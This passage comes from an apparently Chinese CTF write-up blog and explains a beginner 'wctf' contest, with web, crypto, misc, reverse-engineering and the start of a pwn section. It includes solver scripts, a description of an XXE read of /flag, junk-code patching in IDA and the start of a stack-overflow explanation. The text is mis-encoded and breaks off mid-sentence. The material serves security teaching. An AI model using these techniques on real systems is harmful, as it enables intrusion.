(æ³¨æ„ï¼Œæ¯ä¸ªäººå›æ˜¾çš„éƒ½ä¸ä¸€æ ·ï¼Œåœ¨2åˆ†é’Ÿå†…é‡å¤è¿™æ ·çš„æ“ä½œ10æ¬¡å°±èƒ½æ‹¿åˆ°flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDdxO.png" alt="1RDdxO.png"></p><p>å†™è„šæœ¬ä¹Ÿæ˜¯å¾ˆå¿«çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-string">&#x27;&#x27;&#x27; # è¿™æ˜¯çˆ†ç ´md5çš„æ–¹æ³•ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä¸ç”¨</span><br><span class="hljs-string">def get_value(given):</span><br><span class="hljs-string">global dict_az</span><br><span class="hljs-string">for i in range(1000000):</span><br><span class="hljs-string">result = given</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">m = hashlib.md5(result)</span><br><span class="hljs-string">m = m.hexdigest()</span><br><span class="hljs-string">if m[5:9] == &quot;0000&quot;:</span><br><span class="hljs-string">print(&quot;success&quot;)</span><br><span class="hljs-string">print(m)</span><br><span class="hljs-string">return result</span><br><span class="hljs-string">else:</span><br><span class="hljs-string">pass</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url_s</span>):<br>session = requests.Session()<br>result = <span class="hljs-string">&quot;ea&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>url = url_s<br>resp = session.get(url+result)<br>the_page = resp.text<br><span class="hljs-comment"># result = get_value(the_page[0:2])</span><br>result = the_page[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nums = %d&quot;</span> % i)<br>index_1 = the_page.find(<span class="hljs-string">&quot;wctf&quot;</span>)<br>index_2 = the_page.find(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(the_page[index_1:index_2+<span class="hljs-number">1</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>dict_az = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>url = <span class="hljs-string">&quot;http://www.cohacker.cn:23123/challenge13.php?value[]=&quot;</span><br>main(url)<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDOzT.png" alt="1RDOzT.png"></p><h3 id="ç”·äººå°±è¦å¿«ï¼š"><a href="#ç”·äººå°±è¦å¿«ï¼š" class="headerlink" title="ç”·äººå°±è¦å¿«ï¼š"></a>ç”·äººå°±è¦å¿«ï¼š</h3><p>è¿›å…¥é“¾æ¥ï¼Œçœ‹åˆ°é¡µé¢ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDBse.png" alt="1RDBse.png"></p><p>ï¼ˆè‹±è¯­ä¸å¥½çš„ï¼Œç›´æ¥æ”¾ç™¾åº¦ç¿»è¯‘ç¿»è¯‘ä¸€ä¸‹ï¼‰</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDydA.png" alt="1RDydA.png"></p><p>å¤§è‡´æ„æ€å‘¢å°±æ˜¯æäº¤â€™trueâ€™æˆ–è€…â€™falseâ€™ï¼Œåˆ¤æ–­é¡µé¢çš„é‚£ä¸ªå¼å­æ˜¯å¦æ­£ç¡®ï¼Œéœ€è¦è¿ç»­åˆ¤æ–­20æ¬¡ï¼Œä¸”æ¯ä¸€æ¬¡éƒ½è¦åˆ¤æ–­æ­£ç¡®ï¼ˆè¿™é‡Œæœ‰ä¸ªå°å‘å°±æ˜¯ï¼Œä¸æ˜¯è®©ä½ æäº¤æœ€åçš„ç»“æœï¼Œè€Œæ˜¯æäº¤trueæˆ–è€…falseï¼‰ï¼Œè¿˜æœ‰ä¸€ä¸ªå°å‘å°±æ˜¯éœ€è¦åœ¨1-2så†…æäº¤ï¼ˆæ³¨æ„ï¼Œæäº¤éœ€è¦è¶…è¿‡ä¸€ç§’ï¼Œä½†æ˜¯ä¸èƒ½æ…¢äºä¸¤ç§’ï¼‰</p><p>æ‰€ä»¥ï¼Œè¿™é‡Œæ˜¯ç”¨Pythonè„šæœ¬æ¥å¤„ç†ï¼ˆéœ€è¦äº†è§£çš„æ¨¡å—ï¼Œ<code>request</code>ï¼Œ <code>re</code>æˆ–è€…<code>BeautifulSoup</code>ï¼Œ<code>time</code>æ¨¡å—ï¼‰</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD2JP.png" alt="1RD2JP.png"></p><p>20sä¹‹åï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDRRf.png" alt="1RDRRf.png"></p><h3 id="ä½ å¤ªé—²äº†"><a href="#ä½ å¤ªé—²äº†" class="headerlink" title="ä½ å¤ªé—²äº†"></a>ä½ å¤ªé—²äº†</h3><p><img src="https://s2.ax1x.com/2020/02/08/1RDWz8.png" alt="1RDWz8.png"></p><p>ä¸€å¼€å§‹å°±è¿™æ ·ä¸€ä¸ªç•Œé¢ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹å‰ç«¯çš„ä»£ç ï¼š<img src="https://s2.ax1x.com/2020/02/08/1RDhQS.png" alt="1RDhQS.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RD4sg.png" alt="1RD4sg.png"></p><p>æˆ‘ä»¬é¡µé¢éšä¾¿è¾“ä¸€ä¸‹å†…å®¹</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD5LQ.png" alt="1RD5LQ.png"></p><p>å‘ç°å®ƒå°† <code>UserName</code> çš„å†…å®¹è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œè·ŸXMLæœ‰å…³çš„æ¼æ´ï¼Œæˆ‘ä»¬è¿™é‡Œå°è¯•ä½¿ç”¨XXEï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ¼æ´â€”OWASP TOP 10 æ¼æ´ä¹‹ä¸€</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD7on.png" alt="1RD7on.png"></p><p>æ ¹æ®æç¤ºï¼Œflagæ”¾åœ¨&#x2F;flagé‡Œé¢ï¼Œæˆ‘ä»¬è¯»å–ä¸€ä¸‹ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDjQU.png" alt="1RDjQU.png"></p><p>ç„¶åå°±å¾—åˆ°flagäº†</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDvyF.png" alt="1RDvyF.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RH0lF.png" alt="1RH0lF.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>è¿™æ¬¡çš„å¯†ç å­¦é¢˜ç›®ä¸»è¦ç›®çš„å°±æ˜¯æŠŠä¸€äº›å¥‡æ·«æŠ€å·§éƒ½è®©æ–°äººè§è¯†ä¸€ä¸‹ï¼Œå› æ­¤æŠ½å–äº†ä¸€äº›æ¯”è¾ƒæ— è„‘çš„é¢˜ç›®ï¼Œç›´æ¥åœ¨çº¿è·‘å°±å¯ä»¥ã€‚</p><h3 id="ä½ æ˜¯çŒªå—"><a href="#ä½ æ˜¯çŒªå—" class="headerlink" title="ä½ æ˜¯çŒªå—"></a>ä½ æ˜¯çŒªå—</h3><p>é¢˜ç›®è¯´å¾—å¾ˆæ˜æ˜¾äº†ï¼Œè·ŸçŒªæœ‰å…³ï¼Œä¸éš¾æƒ³åˆ°æ˜¯çŒªåœˆå¯†ç ï¼Œç™¾åº¦æ‰¾åˆ°çŒªåœˆå¯†ç ï¼Œå¯¹åº”æŠŠ flag æ‹¼å‡ºæ¥å°±å¯ä»¥ï¼Œè¿™é‡Œ flag è®¾ç½®äº†å¤§å°å†™ä¸æ•æ„Ÿï¼Œä¹Ÿç®—æ˜¯é™ä½äº†éš¾åº¦ï¼Œé€åˆ†é¢˜ã€‚</p><p><a href="https://en.wikipedia.org/wiki/Pigpen_cipher">å‚è€ƒèµ„æ–™ï¼šç»´åŸºç™¾ç§‘-Pigpen_cipher</a></p><p><img src="https://s2.ax1x.com/2020/02/08/1RDnP0.png" alt="1RDnP0.png"></p><h3 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock knock"></a>knock knock</h3><p>æ‘©æ–¯ç”µç ï¼Œæ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œä¹Ÿæ˜¯è°ƒæŸ¥é—®å·è¯„ä¸ºæ— èŠçš„ä¸€é¢˜äº†ï¼Œç›´æ¥ç™¾åº¦Googleä¸€æŠŠæ¢­æ‰¾åˆ°é“¾æ¥ç›´æ¥è½¬æ¢ï¼Œé¢˜ç›®æç¤ºäº† flag ä¸ºæœ‰æ„ä¹‰å°å†™å­—æ¯åŠæ•°å­—ï¼Œæ‰€ä»¥è¦æ˜¯è½¬æˆå¤§å†™çš„å¾—è‡ªå·±è½¬æˆå°å†™ï¼Œé€åˆ†é¢˜ã€‚</p><h3 id="F-k-your-brain"><a href="#F-k-your-brain" class="headerlink" title="F**k your brain"></a>F**k your brain</h3><p>brainfuck ç¼–ç ï¼Œä¹Ÿæ˜¯Googleä¸€ä¸‹å°±æ‰¾åˆ°åœ¨çº¿ç½‘ç«™ï¼Œç›´æ¥è§£ç¼–ç å°±å¯ä»¥ï¼Œä¸»è¦æ˜¯éœ€è¦è®¤å¾—å‡ºæ¥å’Œå­¦ä¼šæ ¹æ®é¢˜ç›®ç­‰ä¿¡æ¯å»å¯»æ‰¾ä¿¡æ¯ï¼Œé€åˆ†é¢˜ã€‚</p><h3 id="look-at-your-keyboard"><a href="#look-at-your-keyboard" class="headerlink" title="look at your keyboard"></a>look at your keyboard</h3><p>å…³é”®è¯ keyboardï¼Œé‚£å°±çœ‹é”®ç›˜ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªä»¥ç©ºæ ¼åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œåœ¨é”®ç›˜ä¸Šåˆšå¥½åœˆå‡ºä¸€ä¸ªå­—æ¯ï¼ŒåŠ ä¸Šæ ¼å¼ wctf{} å³å¯ï¼Œé€åˆ†é¢˜ã€‚</p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>æ ¹æ®é¢˜ç›®ä¸éš¾æƒ³åˆ°æ˜¯baseç¼–ç çš„å˜ç§ï¼Œå¹¶ä¸”tableéƒ½å·²ç»ç»™å‡ºæ¥äº†ï¼Œä¸æ‡‚çš„å¯ä»¥å‚è€ƒ<a href="https://en.wikipedia.org/wiki/Base64">ç»´åŸºç™¾ç§‘-base64</a>ï¼Œé¢˜ç›®åªæ˜¯æŠŠè¡¨æ¢äº†ä¸€ä¸‹ï¼Œå¹¶ä¸”è¿™ç§é¢˜å¯ä»¥å…ˆæ ¹æ®è¡¨æŠŠç»™å‡ºçš„ç¼–ç å­—æ¯æ›¿æ¢æ‰ï¼Œå†è¿›è¡Œæ­£å¸¸çš„ base64 è§£ç ï¼Œè¿™æ ·æ“ä½œå°±æ¯”è¾ƒç®€å•ã€‚</p><p>æ‰‹åŠ¨ä¹Ÿèƒ½åšï¼Œè¿™é‡Œè´´ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>string1 = <span class="hljs-string">&quot;wctfEFGHIOPQJKLMNRSTUVklmWXYZabBdeDghijnop45678qrsCuvAxyz01239+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>base = <span class="hljs-string">b&#x27;axKvWn7DmlKiKgRBJlKBWnV8BN==&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> base:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(i) != <span class="hljs-string">&#x27;=&#x27;</span>:<br>index = string1.find(<span class="hljs-built_in">chr</span>(i))<br>flag += string2[index]<br><span class="hljs-keyword">else</span>:<br>flag += <span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">d2N0ZntiYXNlNjRfMXNfZnVufQ==<br>b&#x27;wctf&#123;base64_1s_fun&#125;&#x27;<br>[Finished in 0.1s]<br></code></pre></td></tr></table></figure><p>å¯†ç å­¦é¢˜éƒ½æ˜¯é€åˆ†é¢˜ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ­¦æ±‰åŠ æ²¹-ä¸­å›½åŠ æ²¹"><a href="#æ­¦æ±‰åŠ æ²¹-ä¸­å›½åŠ æ²¹" class="headerlink" title="æ­¦æ±‰åŠ æ²¹ ä¸­å›½åŠ æ²¹"></a>æ­¦æ±‰åŠ æ²¹ ä¸­å›½åŠ æ²¹</h3><p>ç­¾åˆ°é¢˜ï¼ŒæŠŠ flag å¤åˆ¶å°±å¯ä»¥ï¼Œé€åˆ†é¢˜ã€‚</p><h3 id="Different"><a href="#Different" class="headerlink" title="Different"></a>Different</h3><p>é¢˜ç›®è¯´äº† Differentï¼Œé‚£å°±æ˜¯æ‰¾ä¸åŒï¼Œä¸€èˆ¬æ˜¯æ¯”å¯¹åå…­è¿›åˆ¶æ•°æ®ï¼Œç”¨ Beyond Compare æ‰“å¼€å¯¹æ¯”ï¼Œæ ‡çº¢å·®åˆ«å°±è¡Œï¼Œé€åˆ†é¢˜ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDUG6.png" alt="1RDUG6.png"></p><h3 id="You-are-a-good-man"><a href="#You-are-a-good-man" class="headerlink" title="You are a good man"></a>You are a good man</h3><p>é¢˜ç›®ä¿¡æ¯å†™äº†180cmï¼Œç„¶åæ”¾å‡ºhintè¯´å¾ˆé«˜ï¼Œé‚£ç›´æ¥æŠŠè§£é¢˜æ€è·¯éƒ½è¯´æ¸…æ¥šäº†ï¼šæ”¹å›¾ç‰‡é«˜åº¦ã€‚æˆ‘ä»¬å…ˆå³é”®æŸ¥çœ‹ä¸€ä¸‹å®ƒçš„å°ºå¯¸</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDDqH.png" alt="1RDDqH.png"></p><p>1125ï¼Œæˆ‘ä»¬ç”¨ç¨‹åºå‘˜è®¡ç®—å™¨ï¼ˆWindowsè‡ªå¸¦ï¼‰å°†åå…­è¿›åˆ¶æ•°è®¡ç®—å‡ºæ¥ï¼Œä¸º 465ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD6II.png" alt="1RD6II.png"></p><p>ç„¶åç”¨ Winhex æ‰“å¼€(å…¶å®ƒåå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¹Ÿå¯ä»¥ï¼Œå¦‚010 Editorç­‰)ï¼Œå¯»æ‰¾ 04 65çš„å…³é”®å­—æ ·ï¼Œæ³¨æ„ç¬¬äºŒä¸ªæ‰æ˜¯é«˜ï¼Œå°†ä»–æ”¹é«˜ä¸€ç‚¹å³å¯ï¼Œå¦‚æ”¹æˆ1400ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶å°±æ˜¯ 578ï¼Œå³05 78ï¼Œä¿®æ”¹åä¿å­˜å³å¯ï¼ˆé¢„æœŸè§£æ˜¯1313ï¼‰ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDgit.png" alt="1RDgit.png"></p><p>â€‹</p><p>è¿™æ˜¯åŸå›¾</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg" alt="1RHDOJ.jpg"></p><h3 id="Guess-Where-I-am"><a href="#Guess-Where-I-am" class="headerlink" title="Guess Where I am"></a>Guess Where I am</h3><p>è¿™é¢˜çµæ„Ÿæ¥è‡ª C1CTF çš„ï¼Œä¹Ÿç®—æ˜¯å€Ÿé‰´äº†ï¼Œå›¾ç‰‡æ‰¾äº†ä¸€ä¸ªæ¯”è¾ƒå“²å­¦çš„ï¼Œè™½ç„¶è·Ÿé¢˜ç›®æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œé¢˜ç›®è¡¨è¿°ä¸º<code>Shakespeare will figure out you should take a guess</code>ï¼Œä¸€ä¸ª <code>out</code> ä¸€ä¸ª <code>guess</code>ï¼Œæç¤ºå·²ç»å¾ˆæ˜ç¡®æ˜¯ä½¿ç”¨å·¥å…· <code>outguess</code>äº†ï¼Œé€‰æ‹©è¿™ä¸ªå‡ºé¢˜æ€è·¯ä¹Ÿæ˜¯å‘ç°å­¦æ ¡å¥½åƒæ²¡ä»€ä¹ˆæ¥è§¦è¿‡è¿™ä¸ªå·¥å…·ï¼Œåˆšå¥½å¯ä»¥å€Ÿæœºè®©å¤§å®¶çŸ¥é“ä¸€ä¸‹ã€‚</p><p>å®‰è£…å·¥å…·è‡ªè¡ŒGoogleå³å¯ï¼Œä¸åšé˜è¿°ï¼Œå·¥å…·æœ‰äº†ï¼Œè¿™é¢˜ä¹Ÿå°±æ˜¯é€åˆ†é¢˜äº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ä½¿ç”¨å‘½ä»¤</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">outguess -r guess.jpg flag</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | <span class="hljs-built_in">base64</span> -d</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿™é‡Œæå–å‡ºæ¥çš„æ•°æ®æ˜¯<span class="hljs-built_in">base64</span>ç¼–ç è¿‡ï¼Œå› æ­¤éœ€è¦å†è§£ç ä¸€ä¸‹</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDoZj.png" alt="1RDoZj.png"></p><h3 id="è°ƒæŸ¥é—®å·"><a href="#è°ƒæŸ¥é—®å·" class="headerlink" title="è°ƒæŸ¥é—®å·"></a>è°ƒæŸ¥é—®å·</h3><p>æˆ‘æ˜¯åšæ¢¦æ²¡æƒ³åˆ°è¿™ä¸ªå¯ä»¥éš¾åˆ°ä¸€äº›äººï¼Œç›´æ¥å¡«å†™è°ƒæŸ¥é—®å·å³å¯æ‹¿flagï¼Œé¡ºä¾¿æ‹¿ç‚¹åé¦ˆåšä¸ªç»Ÿè®¡ï¼Œä»¥åå¥½æ”¹è¿›ï¼Œæ¯•ç«Ÿæ˜¯Googleè¡¨å•ï¼Œå› æ­¤éœ€è¦æŒ‚ä¸ªæ¢¯å­ï¼Œé¢˜ç›®ä¹Ÿè¯´æ˜äº†éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œå¡«å¥½ä¹‹åå°±é€flagäº†ï¼Œé€åˆ†é¢˜ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDTds.png" alt="1RDTds.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>åœ¨å­¦æ ¡ä¸»ç«™ä¸Šä¹Ÿæ”¾è¿‡ï¼ŒåŸé¢˜ï¼Œä¹Ÿæ˜¯bugkuä¸­æœ€ç®€å•çš„é€†å‘é¢˜ï¼Œé¢˜ç›®ä¹Ÿæç¤ºäº† <code>IDA is a good tool</code>ï¼Œæˆ‘ä»¬ç›´æ¥æ‹–è¿› IDAï¼Œå°±å¯ä»¥çœ‹åˆ°ä¸€ä¸²æ¯”è¾ƒæ˜æ˜¾çš„ä¸œè¥¿ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDxL4.png" alt="1RDxL4.png"></p><p>æœ€ç®€å•çš„æ–¹æ³•ï¼Œæ‰‹åŠ¨æŒ‰<code>r</code>ï¼Œç”¨çœ¼ç›çœ‹ï¼Œflagå°±æœ‰äº†ï¼Œä¸»è¦æ˜¯è®©å¤§å®¶æŠŠIDAè£…å¥½å¹¶ç®€å•ä½¿ç”¨ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHBy4.png" alt="1RHBy4.png"></p><h3 id="junkcode"><a href="#junkcode" class="headerlink" title="junkcode"></a>junkcode</h3><p><img src="https://s2.ax1x.com/2020/02/08/1W9Lh4.png" alt="1W9Lh4.png"></p><p>ç›´æ¥çœ‹åˆ°æˆ‘ä»¬ç¨‹åºè°ƒç”¨çš„è¿™ä¸ªåœ°æ–¹ä¼šå‘ç°åœ°å€æ˜¯çº¢è‰²çš„ï¼Œæ²¡æœ‰è¯†åˆ«æˆä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦æ˜¯å› ä¸ºIDAæ˜¯ä½¿ç”¨çš„çº¿æ€§æ‰«ææ³•ï¼Œç¢°åˆ°èŠ±æŒ‡ä»¤æ—¶å°±ä¼šå‡ºç°å¦‚ä¸Šæƒ…å†µï¼Œè¿™ç§æ¯”è¾ƒå°ç¨‹åºçš„å¯ä»¥æ‰‹åŠ¨å»èŠ±æŒ‡ä»¤</p><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9j39.png" alt="1W9j39.png"></p><p>å¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨å¼€å§‹å¤„å¼ºè¡ŒCreate functionï¼ŒIDAä¼šæŠ¥å¦‚ä¸‹é”™è¯¯<code>undefined instruction</code>åœ¨<code>text:00000000004007A3</code>ï¼Œè¿‡å»çœ‹ä¸€ä¸‹</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9vcR.png" alt="1W9vcR.png"></p><p>å¾ˆæ˜æ˜¾ä¸­é—´æœ‰ä¸€ä¸ªByteçš„æŒ‡ä»¤æ ¹æœ¬æ²¡æœ‰ç”¨åˆ°ï¼Œæˆ‘ä»¬æŠŠå®ƒnopï¼ˆæœºå™¨ç 0x90ï¼Œä»£è¡¨ä»€ä¹ˆä¹Ÿä¸åšï¼‰æ‰</p><p>å¯ä»¥Ctrl+Alt+Kä½¿ç”¨keypatchï¼Œä¹Ÿå¯ä»¥åˆ°HEXé‡Œé¢æ‰¾åˆ°å¯¹åº”ä½ç½®æŒ‰F2ä¿®æ”¹æˆ90ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9xj1.png" alt="1W9xj1.png"></p><p>ç„¶ååœ¨æ­¤å¤„æŒ‰CæŠŠæ•°æ®è½¬æˆæŒ‡ä»¤</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCSnx.png" alt="1WCSnx.png"></p><p>å†å›æ¥createå°±å‘ç°èƒ½æˆåŠŸäº†ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCpB6.png" alt="1WCpB6.png"></p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>ä½†æ˜¯æ— æ³•f5ï¼Œä¼šæ˜¾ç¤º</p><p><img src="https://s2.ax1x.com/2020/02/08/1WC9HK.png" alt="1WC9HK.png"></p><p>æ˜¯å› ä¸ºè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªèŠ±æŒ‡ä»¤</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCPAO.png" alt="1WCPAO.png"></p><p>è¿™ä¸ªadd rsp,64hæ˜¾ç„¶æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œå¯æ˜¯è¿™ç§æŒ‡ä»¤ä¼šå¹²æ‰°IDAåˆ†æå‡½æ•°ï¼Œadd rspä¸€èˆ¬åªå‡ºç°åœ¨å‡½æ•°è°ƒç”¨åç”¨æ¥é‡Šæ”¾å‚æ•°ç©ºé—´å’Œå¯¹é½ï¼Œç›´æ¥nopæ‰è¿™æ¡æŒ‡ä»¤å†f5</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCiND.png" alt="1WCiND.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸çš„ç¨‹åºåˆ†æäº†</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>æŒ‰ r å°† <code>dest</code> è½¬æˆå­—ç¬¦å½¢å¼</p><p><img src="https://s2.ax1x.com/2020/02/09/1fIFU0.png" alt="1fIFU0.png"></p><p>æˆ‘ä»¬è·Ÿè¸ª <code>src</code> çœ‹åˆ°ä¸º<code>k^a3``7z</code></p><p><img src="https://s2.ax1x.com/2020/02/09/1fIiEq.png" alt="1fIiEq.png"></p><p>å†™è„šæœ¬è®¡ç®—å‡ºæ¥å°±å¯ä»¥äº†ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">b&#x27;wdviO&#123;Uk^a3``7z&#x27;</span><br>flag1 = <span class="hljs-string">&#x27;&#x27;</span><br>flag2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>flag1 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">str</span>[i] - i)<br>flag2 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">str</span>[i+<span class="hljs-number">8</span>] ^ i)<br>flag = flag1 + flag2<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Î» python exp.py<br>wctf&#123;JuNk_c0de1&#125;<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>ä¸€ä¸ªåŸºç¡€æ ˆæº¢å‡º</p><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9TBV.png" alt="1W9TBV.png"></p><p>è¿™ä¸ªé¢˜æœ¬èº«æ²¡æœ‰å¼€ä¿æŠ¤ï¼Œæ—¨åœ¨æƒ³è®©ä½ ä»¬å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ ˆæº¢å‡º</p><p><img src="https://s2.ax1x.com/2020/02/08/1W977T.png" alt="1W977T.png"></p><p>é¦–å…ˆæ‰“å°äº†ä¸€ä¸ªå‡½æ•°åœ°å€</p><p>å¯¹åº”çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1W94cn.png" alt="1W94cn.png"></p><p>ç„¶åwriteå‡ºæç¤ºä¹‹åé€šè¿‡getsè¾“å…¥é€ æˆæ 